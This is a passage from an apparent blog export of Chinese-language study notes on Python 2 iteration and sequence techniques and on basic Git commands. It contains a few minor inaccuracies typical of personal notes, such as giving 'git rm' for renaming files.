    <link href="/2018/09/05/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E8%BF%AD%E4%BB%A3%E7%AF%87%EF%BC%89/"/>
    <url>/2018/09/05/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E8%BF%AD%E4%BB%A3%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="1-如何实现可迭代对象和迭代器对象"><a href="#1-如何实现可迭代对象和迭代器对象" class="headerlink" title="1.如何实现可迭代对象和迭代器对象"></a><strong>1.如何实现可迭代对象和迭代器对象</strong></h2><p>如果想从网络上抓取数据存入字典，然后再对字典进行迭代显示，由于网络I&#x2F;O操作的时间相对较长，这样就会造成用户的长时间等待，我们希望能一次抓取就显示一次，于是迭代器对象出现了。</p><span id="more"></span><p>在 for 循环的时候 in 后面跟的是一个可迭代对象，在循环的过程中自动调用 iter(） 将可迭代对象传入其中，返回一个迭代器对象</p><p><strong>比如我们常见的列表和字符串都是可迭代对象，为什么呢？</strong></p><p>这涉及到了 Python 的魔法方法的问题，python一切皆对象，而魔法方法就是好像是python对象的一个插件，有什么样子的魔法方法，python 对象就会在关键时刻显示某种特性（仿佛科幻小说中主人公体内某种隐藏的力量被激活）。迭代对象有一个魔法方法 <code>__iter__</code>,如果没有这个方法，那么python 还会退而求其次，去寻找<code>__getitem__</code> 这个代表他是一个序列的方法，也是可迭代的。</p><p>迭代器对象只有一个方法就是 next()，每调用一次就会迭代一次，知道全部迭代完毕抛出异常，这其实也是for 循环的工作机制（这同时也说明了一个问题：迭代器内部持有一个状态，该状态用于记录当前迭代所在的位置，以方便下次迭代的时候获取正确的元素）。</p><pre><code class="hljs">l = [1,2,3,4,5,6]t = iter(l)print t.next()print t.next()print t.next()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">123</code></pre><p><strong>实例：</strong></p><ol><li>实现一个迭代器对象，有next 方法每次返回一个值</li><li>实现一个可迭代对象  <code>__iter__</code> 方法返回上面的那个迭代器对象</li></ol><p>实际上就是创建一个可迭代对象的类，实例化以后成为一个可迭代对象，然后一旦在循环中调用这个可迭代对象就能自动调用<code>__init__</code>,然后实例化迭代器对象的类，这个类的实例会在迭代中不断调用next方法。</p><p>代码如下：</p><pre><code class="hljs">import requestsfrom collections import Iterable,Iteratorclass WeatherIterator(Iterator):    def __init__(self,cities):        self.cities = cities        self.index = 0    def getWeather(self,city):        r = requests.get(u&quot;http://wthrcdn.etouch.cn/weather_mini?city=&quot; + city)        data = r.json()[&#39;data&#39;][&#39;forecast&#39;][0]        return &#39;%s: %s , %s&#39; % (city, data[&#39;low&#39;], data[&#39;high&#39;])    def next(self):        if self.index == len(self.cities):            raise StopIteration        city = self.cities[self.index]        self.index += 1        return self.getWeather(city)class WeatherIterable(Iterable):    def __init__(self,cities):        self.cities = cities    def __iter__(self):        return WeatherIterator(self.cities)for x in WeatherIterable([u&quot;北京&quot;,u&quot;上海&quot;,u&quot;广州&quot;,u&quot;长春&quot;]):    print x</code></pre><h2 id="2-如何使用生成器函数实现可迭代对象"><a href="#2-如何使用生成器函数实现可迭代对象" class="headerlink" title="2.如何使用生成器函数实现可迭代对象"></a><strong>2.如何使用生成器函数实现可迭代对象</strong></h2><p>那么什么是生成器？</p><p>生成器对象其实是一种特殊的可迭代对象，他自己调用<code>__iter__</code>方法返回的是他自身，因此他既是一个可迭代对象，也是一个迭代器对象，而且它不需要再像上面的类一样写<code>__iter__()</code>和<code>__next__()</code>方法了，只需要一个yiled关键字（当然你可以重写<code>__iter__</code>来实现自己的功能）。 (说人话就是这个生成器的对象在每一次迭代的时候都会被yiled卡住并返回，下一次再迭代就会接着上次执行，是不是很优雅？)</p><p>举一个简单的生成器的例子：</p><pre><code class="hljs">def f():    print &#39;first&#39;    yield 1    print &#39;second&#39;    yield 2    print &#39;third&#39;    yield 3g = f()for x in g:    print x</code></pre><p> <strong>结果：</strong>   </p><pre><code class="hljs">first1second2third3</code></pre><p><strong>实例：</strong></p><p>找出指定范围内的所有素数</p><pre><code class="hljs">class PrimeNumbers:    def __init__(self,start,end):        self.start = start        self.end = end    def isPrimeNum(self,k):        if k&lt;2:            return False        for x in xrange(2,k):            if k % x == 0:                return False        return True    def __iter__(self):        for k in xrange(self.start,self.end+1):            if self.isPrimeNum(k):                yield kfor x in PrimeNumbers(1,100):    print x</code></pre><h2 id="3-如何进行反向迭代以及如何实现反向迭代"><a href="#3-如何进行反向迭代以及如何实现反向迭代" class="headerlink" title="3.如何进行反向迭代以及如何实现反向迭代"></a><strong>3.如何进行反向迭代以及如何实现反向迭代</strong></h2><h3 id="列表的反向迭代"><a href="#列表的反向迭代" class="headerlink" title="列表的反向迭代"></a><strong>列表的反向迭代</strong></h3><p>（1）使用列表的反转操作</p><pre><code class="hljs">l = [1,2,3,4,5]x = l.reverse()</code></pre><p>但这种情况会改变原列表</p><p>（2）使用切片且步进为-1</p><pre><code class="hljs">l = [1,2,3,4,5]x = l[::-1]</code></pre><p>但这样会生成一个新的列表</p><p>（3）列表反向迭代器</p><pre><code class="hljs">l = [1,2,3,4,5]for x in reversed(l):    print x</code></pre><p>这种情况和iter()刚好是相反的，在迭代的时候会自动调用 <code>__reversed__</code>对象。</p><p><strong>实例：</strong></p><p>写一个浮点数生成器，既可以正向迭代又可以反向迭代</p><pre><code class="hljs">class FloatRange:    def __init__(self,start,end,step):        self.start = start        self.end  = end        self.step = step    def __iter__(self):        t = self.start        while t &lt;= self.end:            yield t            t +=self.step    def __reversed__(self):        t = self.end        while t &gt;= self.start:            yield t            t -= self.stepfor x in FloatRange(1.0,3.0,0.5):    print xprint &quot;===============cut-off rule=====================&quot;for x in reversed(FloatRange(1.0,3.0,0.5)):    print x    </code></pre><h2 id="4-如何对迭代器做切片操作"><a href="#4-如何对迭代器做切片操作" class="headerlink" title="4.如何对迭代器做切片操作"></a><strong>4.如何对迭代器做切片操作</strong></h2><p>我们知道文本文件本身也是一个可迭代对象，每次迭代返回的是文本文件的一行，那么我们思考一个问题，我们能不能像对列表切片一样对文本文件切片得到一个迭代器（生成器），这样比如我们想迭代的是100行带300行之间的内容就能直接迭代了。</p><h3 id="简单回顾文件迭代"><a href="#简单回顾文件迭代" class="headerlink" title="简单回顾文件迭代"></a><strong>简单回顾文件迭代</strong></h3><p>由于文件对象没有<code>__getitem__</code>这个方法，于是没有和列表一样的迭代操作，那我们就可以先把文件的内容放到一个列表里面，然后再进行切片，如下：</p><pre><code class="hljs">f = open(&#39;./LICENCE&#39;)lines = f.readlines()for x in lines[100:300]:    print x</code></pre><p>但是这样有一个问题，readlines 会把文件的所有内容都先加载到内存里面，但是如果文件非常大，比如有几个G大小，那么就会遇到内存不足的问题，于是我们只能选择使用</p><pre><code class="hljs">for line in f:    print line,</code></pre><p>**注意：**如果文件指针此时已经在文件的末尾，你是循环不出内容的，我们还需要将使用 f.seek(0)，将文件指针还原回去</p><p>因此我们迫切的需要将文件变成一个迭代器。</p><pre><code class="hljs">from itertools import islicef = open(&#39;./LICENCE&#39;)for i in islice(f,100,300):    print i</code></pre><p>如果是想得到前100行的迭代器</p><pre><code class="hljs">from itertools import islicef = open(&#39;./LICENCE&#39;)for i in islice(f,100):    print i</code></pre><p>如果想得到从100行开始到最后的迭代器</p><pre><code class="hljs">from itertools import islicef = open(&#39;./LICENCE&#39;)for i in islice(f,100,None):    print i</code></pre><p>注意： islice() 虽然看上去是从100开始的，但是前99行实际上也迭代了，因此下一次使用的时候注意还原。</p><h2 id="5-如何在一个for-语句中迭代多个可迭代对象"><a href="#5-如何在一个for-语句中迭代多个可迭代对象" class="headerlink" title="5.如何在一个for 语句中迭代多个可迭代对象"></a><strong>5.如何在一个for 语句中迭代多个可迭代对象</strong></h2><h3 id="1-并行迭代"><a href="#1-并行迭代" class="headerlink" title="1.并行迭代"></a><strong>1.并行迭代</strong></h3><p>比如 语数外三科成绩分别存储在3个列表中，我们现在需要同时迭代三个列表取出三个成绩，并计算总成绩</p><p>最简单的我们可以使用索引的方式</p><pre><code class="hljs">from random import randintchinese = [randint(60,100) for i in xrange(40)]math = [randint(60,100) for i in xrange(40)]english = [randint(60,100) for i in xrange(40)]for x in xrange(len(math)):    print chinese[x]+math[x]+english[x]    </code></pre><p>但是这个方法有局限性，因为并不是所有的可迭代对象都支持索引的方法访问其中的元素</p><p><strong>高阶推荐：zip()</strong></p><p>zip() 中能传入多个<strong>可迭代对象</strong>并将其逐项合并成一个元组列表，然后我们就能使用元组拆包的方式进行迭代</p><pre><code class="hljs">from random import randintchinese = [randint(60,100) for i in xrange(40)]math = [randint(60,100) for i in xrange(40)]english = [randint(60,100) for i in xrange(40)]grade = []for c,m,e in zip(chinese,math,english):    grade.append(c+m+e)print grade</code></pre><h3 id="2-串行"><a href="#2-串行" class="headerlink" title="2.串行"></a><strong>2.串行</strong></h3><p>比如每个班的英语成绩放在一个列表中，现在想迭代全年级的英语成绩，找出分数高于90分的人数</p><p>使用 itertools 的 chain 可以多个可迭代对象进行串行连接</p><pre><code class="hljs">from random import randintfrom itertools import chaine1 = [randint(60,100) for i in xrange(40)]e2 = [randint(60,100) for i in xrange(40)]e3 = [randint(60,100) for i in xrange(40)]e4 = [randint(60,100) for i in xrange(40)]count = 0for x in chain(e1,e2,e3,e4):    if x &gt; 90:        count += 1</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（序列篇）</title>
    <link href="/2018/09/02/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%BA%8F%E5%88%97%E7%AF%87%EF%BC%89/"/>
    <url>/2018/09/02/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%BA%8F%E5%88%97%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python 作为我们平时使用频率最高的脚本语言拥有着灵活、简洁、高效的特点，但是实际上大多数情况下我们都没有能够发挥其最大的能力，于是分几个部分总结一下编程的技巧，同时也期望对Python 有一个更深的认识。</p><h2 id="1-如何在列表，字典，集合中筛选出指定条件的项"><a href="#1-如何在列表，字典，集合中筛选出指定条件的项" class="headerlink" title="1.如何在列表，字典，集合中筛选出指定条件的项"></a><strong>1.如何在列表，字典，集合中筛选出指定条件的项</strong></h2><p>最简单的方式就是循环</p><span id="more"></span><pre><code class="hljs">dict=[1,2,-2,3,-5,13,5.2]res=[]for i in dict:    if i&gt;0:        res.append(i)print res</code></pre><p>但是循环代码非常的臃肿并且执行的效率很低，于是我们考虑使用函数式编程的方法<br><strong>（1）列表：</strong></p><p>filter函数：</p><pre><code class="hljs">from random import randintdata = [randint(-10,10) for i in range(10)]data = filter(lambda x:x&gt;=0,data)print data</code></pre><p>列表解析：</p><pre><code class="hljs">from random import randintdata = [randint(-10,10) for i in range(10)]data = [x for x in data if x&gt;=0]print data</code></pre><p><strong>（2）字典</strong></p><p>字典解析：</p><pre><code class="hljs">grade = &#123;x:randint(60,100) for x in range(1,20)&#125;grade = &#123;k:v for k,v in grade.iteritems() if v &gt;90&#125;print grade</code></pre><p><strong>（3）集合</strong></p><p>集合解析：</p><pre><code class="hljs">s = set([randint(-10,10) for i in range(10)])s = &#123;x for x in s if x%3==0&#125;print s</code></pre><h2 id="2-如何为元组中的每个元素命名来提高程序可读性"><a href="#2-如何为元组中的每个元素命名来提高程序可读性" class="headerlink" title="2.如何为元组中的每个元素命名来提高程序可读性"></a><strong>2.如何为元组中的每个元素命名来提高程序可读性</strong></h2><p>因为元组结构简单，访问速度快，所以常常被我们用来存放结构一致的数据，但是他的访问还是存在一些问题，比如我们想访问元组中的元素的时候必须使用的是下标的方式，这样就大大降低了程序的可读性，于是我们需要找一个策略解决这个问题。</p><h3 id="方法一：采用宏定义或者枚举类型类似的方式"><a href="#方法一：采用宏定义或者枚举类型类似的方式" class="headerlink" title="方法一：采用宏定义或者枚举类型类似的方式"></a><strong>方法一：采用宏定义或者枚举类型类似的方式</strong></h3><pre><code class="hljs">NAME,AGE,SEX,EMAIL = xrange(4)student =(&quot;tom&quot;,16,&quot;male&quot;,&quot;tom@163.com&quot;)print student[NAME]print student[AGE]print student[SEX]print student[EMAIL]</code></pre><p><strong>注意：解释一下 xange() 在这里面的应用</strong></p><p>xrange() 区别于 range() ,它会生成一个生成器，然后这里面又利用了列表的拆包原理进行了循环的赋值</p><h3 id="方法二：使用namedtuple这个模块创建一个命名元组"><a href="#方法二：使用namedtuple这个模块创建一个命名元组" class="headerlink" title="方法二：使用namedtuple这个模块创建一个命名元组"></a><strong>方法二：使用namedtuple这个模块创建一个命名元组</strong></h3><pre><code class="hljs">from collections import namedtupleStudent = namedtuple(&quot;Student&quot;,[&#39;name&#39;,&#39;age&#39;,&#39;sex&#39;,&#39;email&#39;])s = Student(&quot;tom&quot;,16,&quot;male&quot;,&quot;tom@163.com&quot;)print s print s.age</code></pre><p>上面我们使用的是位置传参的方式，我们还能使用关键字进行传参，这样就不用位置一一对应</p><h2 id="3-如何根据字典的键值对字典的元素进行排序"><a href="#3-如何根据字典的键值对字典的元素进行排序" class="headerlink" title="3.如何根据字典的键值对字典的元素进行排序"></a><strong>3.如何根据字典的键值对字典的元素进行排序</strong></h2><h3 id="方法一：使用-sorted-方法的key-参数"><a href="#方法一：使用-sorted-方法的key-参数" class="headerlink" title="方法一：使用 sorted() 方法的key 参数"></a><strong>方法一：使用 sorted() 方法的key 参数</strong></h3><pre><code class="hljs">from random import randintdata = [randint(0,20) for i in range(30)]s = dict.fromkeys(data,0)for i in data:    s[i]+=1print sorted(s.items(),key=lambda x:x[1])</code></pre><p><strong>参数解释：</strong></p><p>（1）items()可将字典中的每个键值对转换成一个一个的元组，并将这些元组组合成一个list。<br>（2）key值的传入，我们这里使用匿名函数lambda，利用这个函数，我们可以对字典进行按键、按值排序，即x[0]则为按键排序，x[1]则为按值排序。</p><h3 id="方法二：使用zip-将字典键值对互换排列"><a href="#方法二：使用zip-将字典键值对互换排列" class="headerlink" title="方法二：使用zip()将字典键值对互换排列"></a><strong>方法二：使用zip()将字典键值对互换排列</strong></h3><p>因为 sorted() 是按照先比较第一个值在比较第二个值的方式进行比较的，于是我们在转化成元组列表的时候需要对键值对互换</p><p>因为我们能通过字典的 keys 和 values 方法分别获得键值对的列表，而 zip 正好能将多个列表重组成为元组列表。</p><pre><code class="hljs">from random import randintdata = [randint(0,20) for i in range(30)]s = dict.fromkeys(data,0)for i in data:    s[i]+=1print sorted(zip(s.values(),s.keys()))</code></pre><h2 id="4-如何统计序列中出现的元素的频度"><a href="#4-如何统计序列中出现的元素的频度" class="headerlink" title="4.如何统计序列中出现的元素的频度"></a><strong>4.如何统计序列中出现的元素的频度</strong></h2><h3 id="方法一：先转化成字典"><a href="#方法一：先转化成字典" class="headerlink" title="方法一：先转化成字典"></a><strong>方法一：先转化成字典</strong></h3><p>最开始我们的方法可以是将一个序列的值作为字典的键，然后键对应的值默认是0，我们在利用循环遍历整个序列，不断的为字典的值加一</p><pre><code class="hljs">from random import randintdata = [randint(0,20) for i in range(30)]s = dict.fromkeys(data,0)for i in data:    s[i]+=1print s</code></pre><p>我们现在有了字典以后就需要<strong>根据字典的值对结果进行排序</strong></p><h3 id="方法二：使用-collections-的-Counter-方法"><a href="#方法二：使用-collections-的-Counter-方法" class="headerlink" title="方法二：使用 collections 的  Counter 方法"></a><strong>方法二：使用 collections 的  Counter 方法</strong></h3><p>经过 Counter 方法包装过的字典自带了一个叫做most_common 的方法，能直接找到出现频率较高的的指定个数的元素</p><pre><code class="hljs">from random import randintfrom collections import Counterdata = [randint(0,20) for i in range(30)]s = dict.fromkeys(data,0)for i in data:    s[i]+=1print Counter(s).most_common(3)</code></pre><p>  <strong>实例: 统计LICENCE 文件中出现频率最多的单词</strong></p><pre><code class="hljs">import refrom collections import Countertxt = open(&#39;LICENCE&#39;).read()print Counter(re.split(&#39;\W+&#39;,txt)).most_common(10)</code></pre><p>结果：<br>[(‘the’, 309), (‘of’, 210), (‘to’, 177), (‘a’, 171), (‘or’, 138), (‘you’, 106), (‘work’, 97), (‘that’, 91), (‘and’, 91), (‘in’, 76)]</p><h2 id="4-如何快速找到字典中的公共键"><a href="#4-如何快速找到字典中的公共键" class="headerlink" title="4.如何快速找到字典中的公共键"></a><strong>4.如何快速找到字典中的公共键</strong></h2><h3 id="方法一：按照一个字典的键值进行遍历"><a href="#方法一：按照一个字典的键值进行遍历" class="headerlink" title="方法一：按照一个字典的键值进行遍历"></a><strong>方法一：按照一个字典的键值进行遍历</strong></h3><p>我们最简单的思路就是找按照一个字典的键进行遍历，然后判断是不是在另外的字典中</p><pre><code class="hljs">from random import randint,samples1 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s2 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s3 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;res = []for x in s1:    if x in s2 and x in s3:        res.append(x)print res</code></pre><h3 id="方法二：使用集合的交集操作"><a href="#方法二：使用集合的交集操作" class="headerlink" title="方法二：使用集合的交集操作"></a><strong>方法二：使用集合的交集操作</strong></h3><p>集合有一个内置的方法就是 viewkeys 能够以集合的形式显示出来所有的键值</p><pre><code class="hljs">from random import randint,samples1 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s2 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s3 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;print s1.viewkeys() &amp; s2.viewkeys() &amp; s3.viewkeys()</code></pre><h3 id="方法三：使用函数式编程-map-和-reduce-配合"><a href="#方法三：使用函数式编程-map-和-reduce-配合" class="headerlink" title="方法三：使用函数式编程 map() 和 reduce() 配合"></a><strong>方法三：使用函数式编程 map() 和 reduce() 配合</strong></h3><p>reduce() 在两两进行操作的时候的作用非常的大</p><pre><code class="hljs">from random import randint,samples1 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s2 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;s3 = &#123;i:randint(1,4) for i in sample(&#39;abcdefg&#39;,randint(1,7))&#125;res = reduce(lambda x,y:x&amp;y,map(dict.viewkeys,[s1,s2,s3]))print res</code></pre><h2 id="5-如何让字典保持有序"><a href="#5-如何让字典保持有序" class="headerlink" title="5.如何让字典保持有序"></a><strong>5.如何让字典保持有序</strong></h2><h4 id="使用-collections-下面的-OrdetredDict方法"><a href="#使用-collections-下面的-OrdetredDict方法" class="headerlink" title="使用 collections 下面的 OrdetredDict方法"></a>使用 collections 下面的 OrdetredDict方法</h4><pre><code class="hljs">from collections import OrderedDictd = OrderedDict()d[&#39;Jim&#39;] = (1,20)d[&#39;Bob&#39;] = (2,30)d[&#39;Keen&#39;] = (3,40)for i in d:    print i</code></pre><h2 id="6-如何实现显示用户的历史记录功能"><a href="#6-如何实现显示用户的历史记录功能" class="headerlink" title="6. 如何实现显示用户的历史记录功能"></a><strong>6. 如何实现显示用户的历史记录功能</strong></h2><h3 id="方法一：使用容量为n的队列"><a href="#方法一：使用容量为n的队列" class="headerlink" title="方法一：使用容量为n的队列"></a><strong>方法一：使用容量为n的队列</strong></h3><p>使用collections 中的 deque 方法</p><pre><code class="hljs">from collections import dequeq = deque([],5)q.append(1)q.append(2)print q</code></pre><p>但是这个方法有一个弊端，就是我们目前是把记录存储在内存中的，一旦程序退出就消失了，于是我们需要使用文件进行存储</p><h3 id="方法二：使用-pickle-这个工具"><a href="#方法二：使用-pickle-这个工具" class="headerlink" title="方法二：使用 pickle 这个工具"></a><strong>方法二：使用 pickle 这个工具</strong></h3><p>pickle 能将python 对象存入文件中，还能将该对象从文件中还原出来</p><pre><code class="hljs">from collections import dequeimport pickleq = deque([],5)q.append(1)q.append(2)pickle.dump(q,open(&#39;history&#39;,&#39;w&#39;))q2 = pickle.load(open(&#39;history&#39;))print q2</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git 基本操作</title>
    <link href="/2018/09/02/Git%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <url>/2018/09/02/Git%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我之前也没怎么用过github联合多人写项目，对git的操作也是一知半解，但是总是逃不掉的，最近为了填我4个多月前立下的flag，我不得不学习一下git 的操作，并完成项目的 PR，下面就是我的一些记录。 </p><h2 id="git-基本概念"><a href="#git-基本概念" class="headerlink" title="git 基本概念"></a><strong>git 基本概念</strong></h2><p>git 本地有三个重要的区域，我们平时都是在这四个区域中进行操作的</p><span id="more"></span><p>（1）工作区</p><p>（2）暂存区</p><p>（3）本地仓库（从 github 上 clone 下来的仓库）</p><p>（4）远程仓库（github 的仓库）</p><h2 id="认识主人"><a href="#认识主人" class="headerlink" title="认识主人"></a><strong>认识主人</strong></h2><p>有了git以后可以让他认识自己的主人</p><pre><code class="hljs">git config --global user.name &quot;&quot;git config --global user.email &quot;&quot;</code></pre><p>可以查看是否添加成功了自己的用户名和邮箱（要对应自己要操纵的github账号）</p><pre><code class="hljs">git config --list </code></pre><h2 id="创建自己的本地仓库"><a href="#创建自己的本地仓库" class="headerlink" title="创建自己的本地仓库"></a><strong>创建自己的本地仓库</strong></h2><p>先进入自己要创建仓库的目录</p><pre><code class="hljs">cd xxx</code></pre><p>初始化自己的本地仓库</p><pre><code class="hljs">git init </code></pre><p>写一个 README.md </p><pre><code class="hljs">git add README.mdgit commit -m &quot;add a readme.md&quot;</code></pre><h2 id="查看当前项目的状态信息"><a href="#查看当前项目的状态信息" class="headerlink" title="查看当前项目的状态信息"></a><strong>查看当前项目的状态信息</strong></h2><pre><code class="hljs">git status</code></pre><h2 id="恢复上一次提交"><a href="#恢复上一次提交" class="headerlink" title="恢复上一次提交"></a><strong>恢复上一次提交</strong></h2><pre><code class="hljs">git reset HEAD (&lt;filename&gt;/~+n/ID)</code></pre><p><strong>（解释一下这个波浪线，一个波浪线代表退回到上一个版本，~+n 代表退回到上n个版本）</strong></p><h2 id="将暂存区的文件覆盖本地工作区目录文件（慎用）"><a href="#将暂存区的文件覆盖本地工作区目录文件（慎用）" class="headerlink" title="将暂存区的文件覆盖本地工作区目录文件（慎用）"></a><strong>将暂存区的文件覆盖本地工作区目录文件（慎用）</strong></h2><pre><code class="hljs">git checkout &lt;filename&gt;</code></pre><h2 id="查看提交到本地仓库的历史"><a href="#查看提交到本地仓库的历史" class="headerlink" title="查看提交到本地仓库的历史"></a><strong>查看提交到本地仓库的历史</strong></h2><pre><code class="hljs">git log</code></pre><h2 id="回退功能详解"><a href="#回退功能详解" class="headerlink" title="回退功能详解"></a><strong>回退功能详解</strong></h2><p>我们知道我们有三个工作区：工作区、暂存区、本地仓库</p><p>那么版本信息在这三个区域中都是以线性的方式保存的</p><p><strong>1.第一种情况：</strong></p><p>当我们将数据提交到本地仓库以后再执行  </p><pre><code class="hljs">git reset [--mixed ] HEAD~</code></pre><p>实际上影响了两个区域（暂存区和本地仓库），他们的head 指针都会指向上一个版本（注意，快照也就是版本信息并没有丢失，只是指针没有指向那里而已，类似于数据结构），而本地工作区不受影响，于是我们这时候再使用 </p><pre><code class="hljs">git log </code></pre><p>命令查看本地仓库就只有之前的几个版本信息了，使用</p><pre><code class="hljs">git status</code></pre><p>会提示我们说新的版本没有提交到暂存区，这也就是说明了我们本地工作区版本没有回退，但是暂存区和本地仓库都回退了</p><p><strong>2.第二种情况：</strong><br>执行  </p><pre><code class="hljs">git reset --soft HEAD~ </code></pre><p>这条命令只会将本地仓库的版本回退而不会同时回退暂存区的版本（简单的说就是撤销上一次的commit）</p><p><strong>3.第三种情况：</strong><br>执行</p><pre><code class="hljs">git reset --hard HEAD~</code></pre><p>这个命令就是会将三个区域的版本全部回退（慎用）</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p><strong>1.reset 可以指定快照中的个别文件进行回滚</strong></p><pre><code class="hljs">git reset 版本快照  文件名/路径</code></pre><p><strong>2.reset 不仅能往回滚还能往前滚</strong></p><pre><code class="hljs">git reset 版本 ID </code></pre><p><strong>3.如果找不到之前的版本了怎么办</strong><br>别急，下面这条命令能帮助我们</p><pre><code class="hljs">git reflog</code></pre><h2 id="git-的比较功能"><a href="#git-的比较功能" class="headerlink" title="git 的比较功能"></a><strong>git 的比较功能</strong></h2><p><strong>1.比较暂存区和本地工作目录仓库</strong></p><pre><code class="hljs">git diff</code></pre><p>（1）我们看到的 a&#x2F; b&#x2F; 意思是git 将 暂存区和本地工作区的文件拷贝到了两个虚拟的目录下再进行比较</p><p>（2）— 代表旧文件 +++ 代表新文件</p><p>（3）@@ @@ 之间的 -1,20 代表旧文件从第一行到第20行 +1,20 代表新文件从第一行到第20行，这下面是两个文件合并显示的结果</p><p>（4）\no newline at the end of file 这句话表示文件末尾本身没有换行符，但是 Git为了显示的方便自己加了一个换行符</p><p><strong>2.比较历史的两个版本</strong></p><pre><code class="hljs">git diff 版本ID1 版本ID2</code></pre><p><strong>3.比较本地工作区和本地仓库的快照</strong></p><pre><code class="hljs">git diff 版本ID</code></pre><p>如果想和最新的快照版本比较，我们可以不写版本ID </p><pre><code class="hljs">git diff HEAD</code></pre><p><strong>4.比较暂存区和本地仓库的快照</strong></p><pre><code class="hljs">git diff --cached [版本ID]</code></pre><h2 id="实用小技巧"><a href="#实用小技巧" class="headerlink" title="实用小技巧"></a><strong>实用小技巧</strong></h2><p><strong>1.修改最后一次的提交</strong></p><p>如果已经将修改提交到了本地仓库，但是发现自己有些东西又要更新了，但是又不想在本地仓库创建一个新的版本，这时候就需要用到修改功能了</p><pre><code class="hljs">git commit --amend</code></pre><p>执行完以后，暂存区的更新就能和本地仓库同步了</p><p><strong>2.恢复本地删除的文件</strong></p><pre><code class="hljs">git checkout -- &lt;filename&gt;</code></pre><p><strong>3.删除错误提交到远程仓库的文件</strong></p><p>下面这条命令就会把本地工作区和暂存区的指定的文件删除</p><pre><code class="hljs">git rm &lt;filename&gt;</code></pre><p>但是现在本地仓库还存在着我们错误提交的文件，那这个时候我们就需要使用上面介绍的 reset –soft HEAD~ 命令了</p><p><strong>注意：扩展介绍一下 git rm 这个命令</strong></p><p>1.如果我们使用这条命令的时候本地工作区和暂存区不一致，那么会报出提示，如果你使用 -f 选项将会强制将这个文件删除</p><pre><code class="hljs">git rm -f &lt;filename&gt;</code></pre><p>2.如果我们只想删除暂存区的文件而想保留本地工作区的文件的话，我们可以使用 –cached</p><pre><code class="hljs">git rm --cached &lt;filename&gt;</code></pre><p>4.重命名</p><pre><code class="hljs">git rm 旧文件名  新文件名</code></pre><h2 id="git-创建分支"><a href="#git-创建分支" class="headerlink" title="git 创建分支"></a><strong>git 创建分支</strong></h2><pre><code class="hljs">git branch &lt;name&gt;</code></pre><p>查看当前的分支的情况</p><pre><code class="hljs">git log --decorate --oneline</code></pre><p>–decorate 这个参数会显示 HEAD 指向的分支<br>–oneline  这个参数会简略显示关键信息</p><h2 id="git-切换分支"><a href="#git-切换分支" class="headerlink" title="git 切换分支"></a><strong>git 切换分支</strong></h2><pre><code class="hljs">git checkout &lt;name&gt;</code></pre><h3 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>1.git log 只能显示当前的分支的保存的快照<br>2.你在当前分支所做修改以后，如果切换到了另一个分支的话，那么你就会发现，所做的修改都消失了<br>3.以图形化形式显示分支的当前状态</p><pre><code class="hljs">git log --decorate --oneline --graph --all</code></pre><h2 id="git-合并分支"><a href="#git-合并分支" class="headerlink" title="git 合并分支"></a><strong>git 合并分支</strong></h2><p><strong>1.单纯地合并本地的分支</strong></p><pre><code class="hljs">git merge &lt;name&gt;</code></pre><p>但是这种情况一把不会一下子成功，一般都会产生冲突，这种冲突我们需要自己解决</p><p>我们查看一下当前的状态， 这个会显示哪些文件产生了冲突，需要我们手动修改的</p><pre><code class="hljs">git status</code></pre><p>找到对应的文件以后我们就能直接取文件夹中打开这个文件了，为了方便我们的查找，git已经在文件的里面为我们标记了所有冲突的位置，我们只需要将他自动添加的标记删除以后确认我们最终需要的部分保存就可以了</p><p><strong>2.拉取远程和本地合并</strong></p><pre><code class="hljs">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code></pre><p>比如，要取回origin主机的next分支，与本地的master分支合并，需要写成下面这样 -</p><pre><code class="hljs">git pull origin next:master</code></pre><p>过程</p><h2 id="git-删除分支"><a href="#git-删除分支" class="headerlink" title="git 删除分支"></a><strong>git 删除分支</strong></h2><pre><code class="hljs">git branch -d &lt;name&gt;</code></pre><h2 id="将本地分支推送到远程仓库"><a href="#将本地分支推送到远程仓库" class="headerlink" title="将本地分支推送到远程仓库"></a><strong>将本地分支推送到远程仓库</strong></h2><p>git push命令用于将本地分支的更新，推送到远程主机。它的格式与git pull命令相似。</p><pre><code class="hljs">git push 